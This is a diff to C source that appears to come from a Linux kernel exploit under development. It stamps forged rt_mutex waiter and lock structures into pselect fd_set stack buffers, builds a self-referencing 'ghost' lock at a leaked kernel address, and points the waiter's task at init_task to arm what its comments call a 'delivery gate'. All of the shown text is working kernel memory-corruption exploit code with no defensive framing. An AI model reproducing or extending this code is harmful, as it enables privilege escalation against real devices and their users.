@@ -512,6 +512,29 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         if (self_task)
           ghost_task = (uint64_t)self_task;
       }
+      /*
+       * DELIVERY GATE (09-22): every device walk exits at
+       * top_waiter(lock) != waiter — fake_lock's waiters root points at
+       * fake_w0 (page), never at the ghost. With g_ghost_kva known
+       * (consumer parses the blocked-in-select SP from /proc/<tid>/
+       * syscall, ghost = sp + PSELECT_GHOST_DELTA), rebuild the lock
+       * INSIDE the stampable region: ghost->lock = ghost+0x50 (= &ex[0]),
+       * wait_lock@ex[0]=0, waiters root@ex[1]=ghost, leftmost@ex[2]=ghost,
+       * owner@ex[3]=1 (NULL|HAS_WAITERS: the historically-proven clean
+       * exit AFTER the dequeue — the dequeue IS the delivery erase).
+       */
+      uint64_t ghost_lock_word = ghost_lock;
+      uint64_t ex_stamp[4] = {0, 0, 0, 0};
+      int ghost_self_lock = 0;
+      if (g_ghost_kva &&
+          env_int_range("PSELECT_GHOST_SELF_LOCK", 0, 0, 1)) {
+        ghost_lock_word = g_ghost_kva + 0x50;
+        ex_stamp[0] = 0;            /* wait_lock: unlocked            */
+        ex_stamp[1] = g_ghost_kva;  /* waiters.rb_root.rb_node=ghost  */
+        ex_stamp[2] = g_ghost_kva;  /* waiters.rb_leftmost=ghost      */
+        ex_stamp[3] = 1;            /* owner = NULL|HAS_WAITERS       */
+        ghost_self_lock = 1;
+      }
       struct pselect_waiter_word jc2_words[] = {
           /* F9360 (SAME KMI) target.h: "5.10: waiter qword 0 overlaps the
            * first fd-set qword" — at shift=0 ALL TEN words are stampable.
@@ -533,7 +556,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           {4, 0, "pi_right"},
           {5, g_pi_left, "pi_left"},
           {6, ghost_task, "task"},
-          {7, ghost_lock, "lock"},
+          {7, ghost_lock_word, "lock"},
           {8, ghost_prio, "prio"},
           {9, 0, "deadline"},
       };
@@ -542,6 +565,25 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         pselect_put_waiter_word(in, out, ex, words_per_set,
                                 jc2_words[i].word, jc2_words[i].value,
                                 jc2_words[i].name);
+      }
+      if (ghost_self_lock) {
+        /* waiter words 10..13 → global fdset words 10..13 = ex[0..3]:
+         * the self-referencing lock lives entirely in the stamp. */
+        struct pselect_waiter_word lock_words[] = {
+            {10, ex_stamp[0], "lk_wait_lock"},
+            {11, ex_stamp[1], "lk_root"},
+            {12, ex_stamp[2], "lk_leftmost"},
+            {13, ex_stamp[3], "lk_owner"},
+        };
+        for (size_t i = 0; i < sizeof(lock_words) / sizeof(lock_words[0]);
+             i++)
+          pselect_put_waiter_word(in, out, ex, words_per_set,
+                                  lock_words[i].word, lock_words[i].value,
+                                  lock_words[i].name);
+        pr_info("stack JC2 SELF-LOCK: ghost=%016llx lock=%016llx "
+                "root=leftmost=ghost owner=1 (delivery gate armed)\n",
+                (unsigned long long)g_ghost_kva,
+                (unsigned long long)ghost_lock_word);
       }
       pr_info("stack JC2 carrier: words2-9 zero, task=%016llx "
               "(init_task P0) lock=%016llx prio=%llu (write via W0)\n",
